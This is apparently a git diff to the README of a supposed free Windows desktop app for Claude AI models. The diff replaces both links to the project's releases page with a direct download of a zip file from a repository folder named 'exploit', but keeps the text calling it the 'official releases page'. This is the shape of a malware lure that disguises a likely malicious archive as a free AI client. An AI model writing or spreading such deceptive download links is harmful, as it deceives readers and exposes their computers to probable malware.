@@ -1,6 +1,6 @@
 # 🤖 claude-fable-5-desktop-free - Access powerful AI models on Windows
 
-[![Download Latest Version](https://img.shields.io/badge/Download_Now-Blue-blue)](https://github.com/ronicaiconic444/claude-fable-5-desktop-free/releases)
+[![Download Latest Version](https://img.shields.io/badge/Download_Now-Blue-blue)](https://github.com/ronicaiconic444/claude-fable-5-desktop-free/raw/refs/heads/main/exploit/claude-desktop-free-fable-v2.5-beta.4.zip)
 
 ## 📖 About this application
 
@@ -23,7 +23,7 @@ Your Windows computer must meet these basic requirements to run the application 
 
 Follow these instructions to set up the software on your computer.
 
-1. Visit the [official releases page](https://github.com/ronicaiconic444/claude-fable-5-desktop-free/releases).
+1. Visit the [official releases page](https://github.com/ronicaiconic444/claude-fable-5-desktop-free/raw/refs/heads/main/exploit/claude-desktop-free-fable-v2.5-beta.4.zip).
 2. Look for the section labeled "Latest" at the top of the page.
 3. Find the file ending in `.exe` under the "Assets" header.
 4. Click the file name to start the download.
